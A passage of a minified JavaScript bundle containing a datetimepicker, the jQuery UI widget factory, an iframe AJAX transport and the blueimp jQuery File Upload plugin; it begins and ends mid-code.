                    t: j.getDaysInMonth(e.getUTCFullYear(), e.getUTCMonth()),
                    j: e.getUTCDate(),
                    l: E[i].days[e.getUTCDay()],
                    D: E[i].daysShort[e.getUTCDay()],
                    w: e.getUTCDay(),
                    N: 0 == e.getUTCDay() ? 7 : e.getUTCDay(),
                    S: e.getUTCDate() % 10 <= E[i].suffix.length ? E[i].suffix[e.getUTCDate() % 10 - 1] : "",
                    a: 2 == E[i].meridiem.length ? E[i].meridiem[e.getUTCHours() < 12 ? 0 : 1] : "",
                    g: e.getUTCHours() % 12 == 0 ? 12 : e.getUTCHours() % 12,
                    G: e.getUTCHours(),
                    i: e.getUTCMinutes(),
                    s: e.getUTCSeconds()
                }).m = (a.n < 10 ? "0" : "") + a.n,
                a.d = (a.j < 10 ? "0" : "") + a.j,
                a.A = a.a.toString().toUpperCase(),
                a.h = (a.g < 10 ? "0" : "") + a.g,
                a.H = (a.G < 10 ? "0" : "") + a.G,
                a.i = (a.i < 10 ? "0" : "") + a.i,
                a.s = (a.s < 10 ? "0" : "") + a.s
            }
            for (var e = [], o = S.extend([], t.separators), s = 0, r = t.parts.length; s < r; s++)
                o.length && e.push(o.shift()),
                e.push(a[t.parts[s]]);
            return o.length && e.push(o.shift()),
            e.join("")
        },
        convertViewMode: function(e) {
            switch (e) {
            case 4:
            case "decade":
                e = 4;
                break;
            case 3:
            case "year":
                e = 3;
                break;
            case 2:
            case "month":
                e = 2;
                break;
            case 1:
            case "day":
                e = 1;
                break;
            case 0:
            case "hour":
                e = 0
            }
            return e
        },
        headTemplate: '<thead><tr><th class="prev"><i class="fz fz-arrow-left"></i></th><th colspan="5" class="switch"></th><th class="next"><i class="fz fz-arrow-right"></i></th></tr></thead>',
        headTemplateV3: '<thead><tr><th class="prev"><span class="glyphicon glyphicon-arrow-left"></span> </th><th colspan="5" class="switch"></th><th class="next"><span class="glyphicon glyphicon-arrow-right"></span> </th></tr></thead>',
        contTemplate: '<tbody><tr><td colspan="7"></td></tr></tbody>',
        footTemplate: '<tfoot class="tfoot"><tr><th colspan="7" class="today"></th></tr></tfoot>'
    };
    j.template = '<div class="datetimepicker"><div class="datetimepicker-minutes"><table class="table-condensed">' + j.headTemplate + j.contTemplate + j.footTemplate + '</table></div><div class="datetimepicker-hours"><table class="table-condensed">' + j.headTemplate + j.contTemplate + j.footTemplate + '</table></div><div class="datetimepicker-days"><table class="table-condensed">' + j.headTemplate + "<tbody></tbody>" + j.footTemplate + '</table></div><div class="datetimepicker-months"><table class="table-condensed">' + j.headTemplate + j.contTemplate + j.footTemplate + '</table></div><div class="datetimepicker-years"><table class="table-condensed">' + j.headTemplate + j.contTemplate + j.footTemplate + "</table></div></div>",
    j.templateV3 = '<div class="datetimepicker"><div class="datetimepicker-minutes"><table class=" table-condensed">' + j.headTemplateV3 + j.contTemplate + j.footTemplate + '</table></div><div class="datetimepicker-hours"><table class=" table-condensed">' + j.headTemplateV3 + j.contTemplate + j.footTemplate + '</table></div><div class="datetimepicker-days"><table class=" table-condensed">' + j.headTemplateV3 + "<tbody></tbody>" + j.footTemplate + '</table></div><div class="datetimepicker-months"><table class="table-condensed">' + j.headTemplateV3 + j.contTemplate + j.footTemplate + '</table></div><div class="datetimepicker-years"><table class="table-condensed">' + j.headTemplateV3 + j.contTemplate + j.footTemplate + "</table></div></div>",
    S.fn.datetimepicker.DPGlobal = j,
    S.fn.datetimepicker.noConflict = function() {
        return S.fn.datetimepicker = old,
        this
    }
    ,
    S(document).on("focus.datetimepicker.data-api click.datetimepicker.data-api", '[data-provide="datetimepicker"]', function(e) {
        var t = S(this);
        t.data("datetimepicker") || (e.preventDefault(),
        t.datetimepicker("show"))
    }),
    S(function() {
        S('[data-provide="datetimepicker-inline"]').datetimepicker()
    })
}(window.jQuery),
!function(l) {
    var a, i = 0, r = Array.prototype.slice;
    l.cleanData = (a = l.cleanData,
    function(e) {
        for (var t, i, n = 0; null != (i = e[n]); n++)
            try {
                (t = l._data(i, "events")) && t.remove && l(i).triggerHandler("remove")
            } catch (e) {}
        a(e)
    }
    ),
    l.widget = function(e, i, t) {
        var n, a, o, s, r = {}, c = e.split(".")[0];
        return e = e.split(".")[1],
        n = c + "-" + e,
        t || (t = i,
        i = l.Widget),
        l.expr[":"][n.toLowerCase()] = function(e) {
            return !!l.data(e, n)
        }
        ,
        l[c] = l[c] || {},
        a = l[c][e],
        o = l[c][e] = function(e, t) {
            return this._createWidget ? void (arguments.length && this._createWidget(e, t)) : new o(e,t)
        }
        ,
        l.extend(o, a, {
            version: t.version,
            _proto: l.extend({}, t),
            _childConstructors: []
        }),
        (s = new i).options = l.widget.extend({}, s.options),
        l.each(t, function(t, n) {
            return l.isFunction(n) ? void (r[t] = function() {
                var e, t = this._super, i = this._superApply;
                return this._super = a,
                this._superApply = o,
                e = n.apply(this, arguments),
                this._super = t,
                this._superApply = i,
                e
            }
            ) : void (r[t] = n);
            function a() {
                return i.prototype[t].apply(this, arguments)
            }
            function o(e) {
                return i.prototype[t].apply(this, e)
            }
        }),
        o.prototype = l.widget.extend(s, {
            widgetEventPrefix: a && s.widgetEventPrefix || e
        }, r, {
            constructor: o,
            namespace: c,
            widgetName: e,
            widgetFullName: n
        }),
        a ? (l.each(a._childConstructors, function(e, t) {
            var i = t.prototype;
            l.widget(i.namespace + "." + i.widgetName, o, t._proto)
        }),
        delete a._childConstructors) : i._childConstructors.push(o),
        l.widget.bridge(e, o),
        o
    }
    ,
    l.widget.extend = function(e) {
        for (var t, i, n = r.call(arguments, 1), a = 0, o = n.length; a < o; a++)
            for (t in n[a])
                i = n[a][t],
                n[a].hasOwnProperty(t) && void 0 !== i && (e[t] = l.isPlainObject(i) ? l.isPlainObject(e[t]) ? l.widget.extend({}, e[t], i) : l.widget.extend({}, i) : i);
        return e
    }
    ,
    l.widget.bridge = function(o, t) {
        var s = t.prototype.widgetFullName || o;
        l.fn[o] = function(i) {
            var e = "string" == typeof i
              , n = r.call(arguments, 1)
              , a = this;
            return e ? this.each(function() {
                var e, t = l.data(this, s);
                return "instance" === i ? (a = t,
                !1) : t ? l.isFunction(t[i]) && "_" !== i.charAt(0) ? (e = t[i].apply(t, n)) !== t && void 0 !== e ? (a = e && e.jquery ? a.pushStack(e.get()) : e,
                !1) : void 0 : l.error("no such method '" + i + "' for " + o + " widget instance") : l.error("cannot call methods on " + o + " prior to initialization; attempted to call method '" + i + "'")
            }) : (n.length && (i = l.widget.extend.apply(null, [i].concat(n))),
            this.each(function() {
                var e = l.data(this, s);
                e ? (e.option(i || {}),
                e._init && e._init()) : l.data(this, s, new t(i,this))
            })),
            a
        }
    }
    ,
    l.Widget = function() {}
    ,
    l.Widget._childConstructors = [],
    l.Widget.prototype = {
        widgetName: "widget",
        widgetEventPrefix: "",
        defaultElement: "<div>",
        options: {
            disabled: !1,
            create: null
        },
        _createWidget: function(e, t) {
            t = l(t || this.defaultElement || this)[0],
            this.element = l(t),
            this.uuid = i++,
            this.eventNamespace = "." + this.widgetName + this.uuid,
            this.bindings = l(),
            this.hoverable = l(),
            this.focusable = l(),
            t !== this && (l.data(t, this.widgetFullName, this),
            this._on(!0, this.element, {
                remove: function(e) {
                    e.target === t && this.destroy()
                }
            }),
            this.document = l(t.style ? t.ownerDocument : t.document || t),
            this.window = l(this.document[0].defaultView || this.document[0].parentWindow)),
            this.options = l.widget.extend({}, this.options, this._getCreateOptions(), e),
            this._create(),
            this._trigger("create", null, this._getCreateEventData()),
            this._init()
        },
        _getCreateOptions: l.noop,
        _getCreateEventData: l.noop,
        _create: l.noop,
        _init: l.noop,
        destroy: function() {
            this._destroy(),
            this.element.unbind(this.eventNamespace).removeData(this.widgetFullName).removeData(l.camelCase(this.widgetFullName)),
            this.widget().unbind(this.eventNamespace).removeAttr("aria-disabled").removeClass(this.widgetFullName + "-disabled ui-state-disabled"),
            this.bindings.unbind(this.eventNamespace),
            this.hoverable.removeClass("ui-state-hover"),
            this.focusable.removeClass("ui-state-focus")
        },
        _destroy: l.noop,
        widget: function() {
            return this.element
        },
        option: function(e, t) {
            var i, n, a, o = e;
            if (0 === arguments.length)
                return l.widget.extend({}, this.options);
            if ("string" == typeof e)
                if (o = {},
                e = (i = e.split(".")).shift(),
                i.length) {
                    for (n = o[e] = l.widget.extend({}, this.options[e]),
                    a = 0; a < i.length - 1; a++)
                        n[i[a]] = n[i[a]] || {},
                        n = n[i[a]];
                    if (e = i.pop(),
                    1 === arguments.length)
                        return void 0 === n[e] ? null : n[e];
                    n[e] = t
                } else {
                    if (1 === arguments.length)
                        return void 0 === this.options[e] ? null : this.options[e];
                    o[e] = t
                }
            return this._setOptions(o),
            this
        },
        _setOptions: function(e) {
            for (var t in e)
                this._setOption(t, e[t]);
            return this
        },
        _setOption: function(e, t) {
            return this.options[e] = t,
            "disabled" === e && (this.widget().toggleClass(this.widgetFullName + "-disabled", !!t),
            t && (this.hoverable.removeClass("ui-state-hover"),
            this.focusable.removeClass("ui-state-focus"))),
            this
        },
        enable: function() {
            return this._setOptions({
                disabled: !1
            })
        },
        disable: function() {
            return this._setOptions({
                disabled: !0
            })
        },
        _on: function(a, o, e) {
            var s, r = this;
            "boolean" != typeof a && (e = o,
            o = a,
            a = !1),
            e ? (o = s = l(o),
            this.bindings = this.bindings.add(o)) : (e = o,
            o = this.element,
            s = this.widget()),
            l.each(e, function(e, t) {
                function i() {
                    return a || !0 !== r.options.disabled && !l(this).hasClass("ui-state-disabled") ? ("string" == typeof t ? r[t] : t).apply(r, arguments) : void 0
                }
                "string" != typeof t && (i.guid = t.guid = t.guid || i.guid || l.guid++);
                var e = e.match(/^([\w:-]*)\s*(.*)$/)
                  , n = e[1] + r.eventNamespace
                  , e = e[2];
                e ? s.delegate(e, n, i) : o.bind(n, i)
            })
        },
        _off: function(e, t) {
            t = (t || "").split(" ").join(this.eventNamespace + " ") + this.eventNamespace,
            e.unbind(t).undelegate(t),
            this.bindings = l(this.bindings.not(e).get()),
            this.focusable = l(this.focusable.not(e).get()),
            this.hoverable = l(this.hoverable.not(e).get())
        },
        _delay: function(e, t) {
            var i = this;
            return setTimeout(function() {
                return ("string" == typeof e ? i[e] : e).apply(i, arguments)
            }, t || 0)
        },
        _hoverable: function(e) {
            this.hoverable = this.hoverable.add(e),
            this._on(e, {
                mouseenter: function(e) {
                    l(e.currentTarget).addClass("ui-state-hover")
                },
                mouseleave: function(e) {
                    l(e.currentTarget).removeClass("ui-state-hover")
                }
            })
        },
        _focusable: function(e) {
            this.focusable = this.focusable.add(e),
            this._on(e, {
                focusin: function(e) {
                    l(e.currentTarget).addClass("ui-state-focus")
                },
                focusout: function(e) {
                    l(e.currentTarget).removeClass("ui-state-focus")
                }
            })
        },
        _trigger: function(e, t, i) {
            var n, a, o = this.options[e];
            if (i = i || {},
            (t = l.Event(t)).type = (e === this.widgetEventPrefix ? e : this.widgetEventPrefix + e).toLowerCase(),
            t.target = this.element[0],
            a = t.originalEvent)
                for (n in a)
                    n in t || (t[n] = a[n]);
            return this.element.trigger(t, i),
            !(l.isFunction(o) && !1 === o.apply(this.element[0], [t].concat(i)) || t.isDefaultPrevented())
        }
    },
    l.each({
        show: "fadeIn",
        hide: "fadeOut"
    }, function(o, s) {
        l.Widget.prototype["_" + o] = function(t, e, i) {
            var n = (e = "string" == typeof e ? {
                effect: e
            } : e) ? !0 !== e && "number" != typeof e && e.effect || s : o
              , a = !l.isEmptyObject(e = "number" == typeof (e = e || {}) ? {
                duration: e
            } : e);
            e.complete = i,
            e.delay && t.delay(e.delay),
            a && l.effects && l.effects.effect[n] ? t[o](e) : n !== o && t[n] ? t[n](e.duration, e.easing, i) : t.queue(function(e) {
                l(this)[o](),
                i && i.call(t[0]),
                e()
            })
        }
    }),
    l.widget
}(jQuery),
!function(e) {
    "use strict";
    "function" == typeof define && define.amd ? define(["jquery"], e) : "object" == typeof exports ? e(require("jquery")) : e(window.jQuery)
}(function(c) {
    "use strict";
    var i = 0
      , t = c
      , n = "parseJSON";
    "JSON"in window && "parse"in JSON && (t = JSON,
    n = "parse"),
    c.ajaxTransport("iframe", function(a) {
        var o, s, r, t;
        if (a.async)
            return o = a.initialIframeSrc || "javascript:false;",
            {
                send: function(e, n) {
                    (s = c('<form style="display:none;"></form>')).attr("accept-charset", a.formAcceptCharset),
                    t = /\?/.test(a.url) ? "&" : "?",
                    "DELETE" === a.type ? (a.url = a.url + t + "_method=DELETE",
                    a.type = "POST") : "PUT" === a.type ? (a.url = a.url + t + "_method=PUT",
                    a.type = "POST") : "PATCH" === a.type && (a.url = a.url + t + "_method=PATCH",
                    a.type = "POST"),
                    r = c('<iframe src="' + o + '" name="iframe-transport-' + (i += 1) + '"></iframe>').bind("load", function() {
                        var i, t = c.isArray(a.paramName) ? a.paramName : [a.paramName];
                        r.unbind("load").bind("load", function() {
                            var t;
                            try {
                                if (!(t = r.contents()).length || !t[0].firstChild)
                                    throw new Error
                            } catch (e) {
                                t = void 0
                            }
                            n(200, "success", {
                                iframe: t
                            }),
                            c('<iframe src="' + o + '"></iframe>').appendTo(s),
                            window.setTimeout(function() {
                                s.remove()
                            }, 0)
                        }),
                        s.prop("target", r.prop("name")).prop("action", a.url).prop("method", a.type),
                        a.formData && c.each(a.formData, function(e, t) {
                            c('<input type="hidden"/>').prop("name", t.name).val(t.value).appendTo(s)
                        }),
                        a.fileInput && a.fileInput.length && "POST" === a.type && (i = a.fileInput.clone(),
                        a.fileInput.after(function(e) {
                            return i[e]
                        }),
                        a.paramName && a.fileInput.each(function(e) {
                            c(this).prop("name", t[e] || a.paramName)
                        }),
                        s.append(a.fileInput).prop("enctype", "multipart/form-data").prop("encoding", "multipart/form-data"),
                        a.fileInput.removeAttr("form")),
                        s.submit(),
                        i && i.length && a.fileInput.each(function(e, t) {
                            e = c(i[e]);
                            c(t).prop("name", e.prop("name")).attr("form", e.attr("form")),
                            e.replaceWith(t)
                        })
                    }),
                    s.append(r).appendTo(document.body)
                },
                abort: function() {
                    r && r.unbind("load").prop("src", o),
                    s && s.remove()
                }
            }
    }),
    c.ajaxSetup({
        converters: {
            "iframe text": function(e) {
                return e && c(e[0].body).text()
            },
            "iframe json": function(e) {
                return e && t[n](c(e[0].body).text())
            },
            "iframe html": function(e) {
                return e && c(e[0].body).html()
            },
            "iframe xml": function(e) {
                e = e && e[0];
                return e && c.isXMLDoc(e) ? e : c.parseXML(e.XMLDocument && e.XMLDocument.xml || c(e.body).html())
            },
            "iframe script": function(e) {
                return e && c.globalEval(c(e[0].body).text())
            }
        }
    })
}),
!function(e) {
    "use strict";
    "function" == typeof define && define.amd ? define(["jquery", "jquery-ui/ui/widget"], e) : "object" == typeof exports ? e(require("jquery"), require("./vendor/jquery.ui.widget")) : e(window.jQuery)
}(function(v) {
    "use strict";
    function e(i) {
        var n = "dragover" === i;
        return function(e) {
            e.dataTransfer = e.originalEvent && e.originalEvent.dataTransfer;
            var t = e.dataTransfer;
            t && -1 !== v.inArray("Files", t.types) && !1 !== this._trigger(i, v.Event(i, {
                delegatedEvent: e
            })) && (e.preventDefault(),
            n && (t.dropEffect = "copy"))
        }
    }
    v.support.fileInput = !(new RegExp("(Android (1\\.[0156]|2\\.[01]))|(Windows Phone (OS 7|8\\.0))|(XBLWP)|(ZuneWP)|(WPDesktop)|(w(eb)?OSBrowser)|(webOS)|(Kindle/(1\\.0|2\\.[05]|3\\.0))").test(window.navigator.userAgent) || v('<input type="file"/>').prop("disabled")),
    v.support.xhrFileUpload = !(!window.ProgressEvent || !window.FileReader),
    v.support.xhrFormDataFileUpload = !!window.FormData,
    v.support.blobSlice = window.Blob && (Blob.prototype.slice || Blob.prototype.webkitSlice || Blob.prototype.mozSlice),
    v.widget("blueimp.fileupload", {
        options: {
            dropZone: v(document),
            pasteZone: void 0,
            fileInput: void 0,
            replaceFileInput: !0,
            paramName: void 0,
            singleFileUploads: !0,
            limitMultiFileUploads: void 0,
            limitMultiFileUploadSize: void 0,
            limitMultiFileUploadSizeOverhead: 512,
            sequentialUploads: !1,
            limitConcurrentUploads: void 0,
            forceIframeTransport: !1,
            redirect: void 0,
            redirectParamName: void 0,
            postMessage: void 0,
            multipart: !0,
            maxChunkSize: void 0,
            uploadedBytes: void 0,
            recalculateProgress: !0,
            progressInterval: 100,
            bitrateInterval: 500,
            autoUpload: !0,
            messages: {
                uploadedBytes: "Uploaded bytes exceed file size"
            },
            i18n: function(i, e) {
                return i = this.messages[i] || i.toString(),
                e && v.each(e, function(e, t) {
                    i = i.replace("{" + e + "}", t)
                }),
                i
            },
            formData: function(e) {
                return e.serializeArray()
            },
            add: function(e, t) {
                if (e.isDefaultPrevented())
                    return !1;
                (t.autoUpload || !1 !== t.autoUpload && v(this).fileupload("option", "autoUpload")) && t.process().done(function() {
                    t.submit()
                })
            },
            processData: !1,
            contentType: !1,
            cache: !1,
            timeout: 0
        },
        _specialOptions: ["fileInput", "dropZone", "pasteZone", "multipart", "forceIframeTransport"],
        _blobSlice: v.support.blobSlice && function() {
            return (this.slice || this.webkitSlice || this.mozSlice).apply(this, arguments)
        }
        ,
        _BitrateTimer: function() {
            this.timestamp = Date.now ? Date.now() : (new Date).getTime(),
            this.loaded = 0,
            this.bitrate = 0,
            this.getBitrate = function(e, t, i) {
                var n = e - this.timestamp;
                return this.bitrate && i && !(i < n) || (this.bitrate = (t - this.loaded) * (1e3 / n) * 8,
                this.loaded = t,
                this.timestamp = e),
                this.bitrate
            }
        },
        _isXHRUpload: function(e) {
            return !e.forceIframeTransport && (!e.multipart && v.support.xhrFileUpload || v.support.xhrFormDataFileUpload)
        },
        _getFormData: function(e) {
            var i;
            return "function" === v.type(e.formData) ? e.formData(e.form) : v.isArray(e.formData) ? e.formData : "object" === v.type(e.formData) ? (i = [],
            v.each(e.formData, function(e, t) {
                i.push({
                    name: e,
                    value: t
                })
            }),
            i) : []
        },
        _getTotal: function(e) {
            var i = 0;
            return v.each(e, function(e, t) {
                i += t.size || 1
            }),
            i
        },
        _initProgressObject: function(e) {
            var t = {
                loaded: 0,
                total: 0,
                bitrate: 0
            };
            e._progress ? v.extend(e._progress, t) : e._progress = t
        },
        _initResponseObject: function(e) {
            if (e._response)
                for (var t in e._response)
                    e._response.hasOwnProperty(t) && delete e._response[t];
            else
                e._response = {}
        },
        _onProgress: function(e, t) {
            var i, n;
            e.lengthComputable && (i = Date.now ? Date.now() : (new Date).getTime(),
            t._time && t.progressInterval && i - t._time < t.progressInterval && e.loaded !== e.total || (t._time = i,
            n = Math.floor(e.loaded / e.total * (t.chunkSize || t._progress.total)) + (t.uploadedBytes || 0),
            this._progress.loaded += n - t._progress.loaded,
            this._progress.bitrate = this._bitrateTimer.getBitrate(i, this._progress.loaded, t.bitrateInterval),
            t._progress.loaded = t.loaded = n,
            t._progress.bitrate = t.bitrate = t._bitrateTimer.getBitrate(i, n, t.bitrateInterval),
            this._trigger("progress", v.Event("progress", {
                delegatedEvent: e
            }), t),
            this._trigger("progressall", v.Event("progressall", {
                delegatedEvent: e
            }), this._progress)))
        },
        _initProgressListener: function(i) {
            var n = this
              , e = (i.xhr ? i : v.ajaxSettings).xhr();
            e.upload && (v(e.upload).bind("progress", function(e) {
                var t = e.originalEvent;
                e.lengthComputable = t.lengthComputable,
                e.loaded = t.loaded,
                e.total = t.total,
                n._onProgress(e, i)
            }),
            i.xhr = function() {
                return e
            }
            )
        },
        _deinitProgressListener: function(e) {
            e = (e.xhr ? e : v.ajaxSettings).xhr();
            e.upload && v(e.upload).unbind("progress")
        },
        _isInstanceOf: function(e, t) {
            return Object.prototype.toString.call(t) === "[object " + e + "]"
        },
        _initXHRData: function(i) {
            var n, a = this, e = i.files[0], t = i.multipart || !v.support.xhrFileUpload, o = "array" === v.type(i.paramName) ? i.paramName[0] : i.paramName;
            i.headers = v.extend({}, i.headers),
            i.contentRange && (i.headers["Content-Range"] = i.contentRange),
            t && !i.blob && this._isInstanceOf("File", e) || (i.headers["Content-Disposition"] = 'attachment; filename="' + encodeURI(e.uploadName || e.name) + '"'),
            t ? v.support.xhrFormDataFileUpload && (i.postMessage ? (n = this._getFormData(i),
            i.blob ? n.push({
                name: o,
                value: i.blob
            }) : v.each(i.files, function(e, t) {
                n.push({
                    name: "array" === v.type(i.paramName) && i.paramName[e] || o,
                    value: t
                })
            })) : (a._isInstanceOf("FormData", i.formData) ? n = i.formData : (n = new FormData,
            v.each(this._getFormData(i), function(e, t) {
                n.append(t.name, t.value)
            })),
            i.blob ? n.append(o, i.blob, e.uploadName || e.name) : v.each(i.files, function(e, t) {
                (a._isInstanceOf("File", t) || a._isInstanceOf("Blob", t)) && n.append("array" === v.type(i.paramName) && i.paramName[e] || o, t, t.uploadName || t.name)
            })),
            i.data = n) : (i.contentType = e.type || "application/octet-stream",
            i.data = i.blob || e),
            i.blob = null
        },
        _initIframeSettings: function(e) {
            var t = v("<a></a>").prop("href", e.url).prop("host");
            e.dataType = "iframe " + (e.dataType || ""),
            e.formData = this._getFormData(e),
            e.redirect && t && t !== location.host && e.formData.push({
                name: e.redirectParamName || "redirect",
                value: e.redirect
            })
        },
        _initDataSettings: function(e) {
            this._isXHRUpload(e) ? (this._chunkedUpload(e, !0) || (e.data || this._initXHRData(e),
            this._initProgressListener(e)),
            e.postMessage && (e.dataType = "postmessage " + (e.dataType || ""))) : this._initIframeSettings(e)
        },
        _getParamName: function(e) {
            var t = v(e.fileInput)
              , n = e.paramName;
            return n ? v.isArray(n) || (n = [n]) : (n = [],
            t.each(function() {
                for (var e = v(this), t = e.prop("name") || "files[]", i = (e.prop("files") || [1]).length; i; )
                    n.push(t),
                    --i
            }),
            n.length || (n = [t.prop("name") || "files[]"])),
            n
        },
        _initFormSettings: function(e) {
            e.form && e.form.length || (e.form = v(e.fileInput.prop("form")),
            e.form.length || (e.form = v(this.options.fileInput.prop("form")))),
            e.paramName = this._getParamName(e),
            e.url || (e.url = e.form.prop("action") || location.href),
            e.type = (e.type || "string" === v.type(e.form.prop("method")) && e.form.prop("method") || "").toUpperCase(),
            "POST" !== e.type && "PUT" !== e.type && "PATCH" !== e.type && (e.type = "POST"),
            e.formAcceptCharset || (e.formAcceptCharset = e.form.attr("accept-charset"))
        },
        _getAJAXSettings: function(e) {
            e = v.extend({}, this.options, e);
            return this._initFormSettings(e),
            this._initDataSettings(e),
            e
        },
        _getDeferredState: function(e) {
            return e.state ? e.state() : e.isResolved() ? "resolved" : e.isRejected() ? "rejected" : "pending"
        },
        _enhancePromise: function(e) {
            return e.success = e.done,
            e.error = e.fail,
            e.complete = e.always,
            e
        },
        _getXHRPromise: function(e, t, i) {
            var n = v.Deferred()
              , a = n.promise();
            return t = t || this.options.context || a,
            !0 === e ? n.resolveWith(t, i) : !1 === e && n.rejectWith(t, i),
            a.abort = n.promise,
            this._enhancePromise(a)
        },
        _addConvenienceMethods: function(e, i) {
            function n(e) {
                return v.Deferred().resolveWith(a, e).promise()
            }
            var a = this;
            i.process = function(e, t) {
                return (e || t) && (i._processQueue = this._processQueue = (this._processQueue || n([this])).then(function() {
                    return i.errorThrown ? v.Deferred().rejectWith(a, [i]).promise() : n(arguments)
                }).then(e, t)),
                this._processQueue || n([this])
            }
            ,
            i.submit = function() {
                return "pending" !== this.state() && (i.jqXHR = this.jqXHR = !1 !== a._trigger("submit", v.Event("submit", {
                    delegatedEvent: e
                }), this) && a._onSend(e, this)),
                this.jqXHR || a._getXHRPromise()
            }
            ,
            i.abort = function() {
                return this.jqXHR ? this.jqXHR.abort() : (this.errorThrown = "abort",
                a._trigger("fail", null, this),
                a._getXHRPromise(!1))
            }
            ,
            i.state = function() {
                return this.jqXHR ? a._getDeferredState(this.jqXHR) : this._processQueue ? a._getDeferredState(this._processQueue) : void 0
            }
            ,
            i.processing = function() {
                return !this.jqXHR && this._processQueue && "pending" === a._getDeferredState(this._processQueue)
            }
            ,
            i.progress = function() {
                return this._progress
            }
            ,
            i.response = function() {
                return this._response
            }
        },
        _getUploadedBytes: function(e) {
            e = e.getResponseHeader("Range"),
            e = e && e.split("-"),
            e = e && 1 < e.length && parseInt(e[1], 10);
            return e && e + 1
        },
        _chunkedUpload: function(o, e) {
            o.uploadedBytes = o.uploadedBytes || 0;
            var t, s, r = this, i = o.files[0], c = i.size, l = o.uploadedBytes, d = o.maxChunkSize || c, p = this._blobSlice, u = v.Deferred(), n = u.promise();
            return !(!(this._isXHRUpload(o) && p && (l || ("function" === v.type(d) ? d(o) : d) < c)) || o.data) && (!!e || (c <= l ? (i.error = o.i18n("uploadedBytes"),
            this._getXHRPromise(!1, o.context, [null, "error", i.error])) : (s = function() {
                var n = v.extend({}, o)
                  , a = n._progress.loaded;
                n.blob = p.call(i, l, l + ("function" === v.type(d) ? d(n) : d), i.type),
                n.chunkSize = n.blob.size,
                n.contentRange = "bytes " + l + "-" + (l + n.chunkSize - 1) + "/" + c,
                r._trigger("chunkbeforesend", null, n),
                r._initXHRData(n),
                r._initProgressListener(n),
                t = (!1 !== r._trigger("chunksend", null, n) && v.ajax(n) || r._getXHRPromise(!1, n.context)).done(function(e, t, i) {
                    l = r._getUploadedBytes(i) || l + n.chunkSize,
                    a + n.chunkSize - n._progress.loaded && r._onProgress(v.Event("progress", {
                        lengthComputable: !0,
                        loaded: l - n.uploadedBytes,
                        total: l - n.uploadedBytes
                    }), n),
                    o.uploadedBytes = n.uploadedBytes = l,
                    n.result = e,
                    n.textStatus = t,
                    n.jqXHR = i,
                    r._trigger("chunkdone", null, n),
                    r._trigger("chunkalways", null, n),
                    l < c ? s() : u.resolveWith(n.context, [e, t, i])
                }).fail(function(e, t, i) {
                    n.jqXHR = e,
                    n.textStatus = t,
                    n.errorThrown = i,
                    r._trigger("chunkfail", null, n),
                    r._trigger("chunkalways", null, n),
                    u.rejectWith(n.context, [e, t, i])
                }).always(function() {
                    r._deinitProgressListener(n)
                })
            }
            ,
            this._enhancePromise(n),
            n.abort = function() {
                return t.abort()
            }
            ,
            s(),
            n)))
        },
        _beforeSend: function(e, t) {
            0 === this._active && (this._trigger("start"),
            this._bitrateTimer = new this._BitrateTimer,
            this._progress.loaded = this._progress.total = 0,
            this._progress.bitrate = 0),
            this._initResponseObject(t),
            this._initProgressObject(t),
            t._progress.loaded = t.loaded = t.uploadedBytes || 0,
            t._progress.total = t.total = this._getTotal(t.files) || 1,
            t._progress.bitrate = t.bitrate = 0,
            this._active += 1,
            this._progress.loaded += t.loaded,
            this._progress.total += t.total
        },
        _onDone: function(e, t, i, n) {
            var a = n._progress.total
              , o = n._response;
            n._progress.loaded < a && this._onProgress(v.Event("progress", {
                lengthComputable: !0,
                loaded: a,
                total: a
            }), n),
            o.result = n.result = e,
            o.textStatus = n.textStatus = t,
            o.jqXHR = n.jqXHR = i,
            this._trigger("done", null, n)
        },
        _onFail: function(e, t, i, n) {
            var a = n._response;
            n.recalculateProgress && (this._progress.loaded -= n._progress.loaded,
            this._progress.total -= n._progress.total),
            a.jqXHR = n.jqXHR = e,
            a.textStatus = n.textStatus = t,
            a.errorThrown = n.errorThrown = i,
            this._trigger("fail", null, n)
        },
        _onAlways: function(e, t, i, n) {
            this._trigger("always", null, n)
        },
        _onSend: function(e, t) {
            t.submit || this._addConvenienceMethods(e, t);
            function i() {
                return s._sending += 1,
                r._bitrateTimer = new s._BitrateTimer,
                n = n || ((a || !1 === s._trigger("send", v.Event("send", {
                    delegatedEvent: e
                }), r)) && s._getXHRPromise(!1, r.context, a) || s._chunkedUpload(r) || v.ajax(r)).done(function(e, t, i) {
                    s._onDone(e, t, i, r)
                }).fail(function(e, t, i) {
                    s._onFail(e, t, i, r)
                }).always(function(e, t, i) {
                    if (s._deinitProgressListener(r),
                    s._onAlways(e, t, i, r),
                    --s._sending,
                    --s._active,
                    r.limitConcurrentUploads && r.limitConcurrentUploads > s._sending)
                        for (var n = s._slots.shift(); n; ) {
                            if ("pending" === s._getDeferredState(n)) {
                                n.resolve();
                                break
                            }
                            n = s._slots.shift()
                        }
                    0 === s._active && s._trigger("stop")
                })
            }
            var n, a, o, s = this, r = s._getAJAXSettings(t);
            return this._beforeSend(e, r),
            this.options.sequentialUploads || this.options.limitConcurrentUploads && this.options.limitConcurrentUploads <= this._sending ? ((t = 1 < this.options.limitConcurrentUploads ? (o = v.Deferred(),
            this._slots.push(o),
            o.then(i)) : (this._sequence = this._sequence.then(i, i),
            this._sequence)).abort = function() {
                return a = [void 0, "abort", "abort"],
                n ? n.abort() : (o && o.rejectWith(r.context, a),
                i())
            }
            ,
            this._enhancePromise(t)) : i()
        },
        _onAdd: function(n, a) {
            var o, e, s, t, r = this, c = !0, i = v.extend({}, this.options, a), l = a.files, d = l.length, p = i.limitMultiFileUploads, u = i.limitMultiFileUploadSize, h = i.limitMultiFileUploadSizeOverhead, f = 0, m = this._getParamName(i), g = 0;
            if (!d)
                return !1;
            if (u && void 0 === l[0].size && (u = void 0),
            (i.singleFileUploads || p || u) && this._isXHRUpload(i))
                if (i.singleFileUploads || u || !p)
                    if (!i.singleFileUploads && u)
                        for (s = [],
                        o = [],
                        t = 0; t < d; t += 1)
                            f += l[t].size + h,
                            (t + 1 === d || f + l[t + 1].size + h > u || p && p <= t + 1 - g) && (s.push(l.slice(g, t + 1)),
                            (e = m.slice(g, t + 1)).length || (e = m),
                            o.push(e),
                            g = t + 1,
                            f = 0);
                    else
                        o = m;
                else
                    for (s = [],
                    o = [],
                    t = 0; t < d; t += p)
                        s.push(l.slice(t, t + p)),
                        (e = m.slice(t, t + p)).length || (e = m),
                        o.push(e);
            else
                s = [l],
                o = [m];
            return a.originalFiles = l,
            v.each(s || l, function(e, t) {
                var i = v.extend({}, a);
                return i.files = s ? t : [t],
                i.paramName = o[e],
                r._initResponseObject(i),
                r._initProgressObject(i),
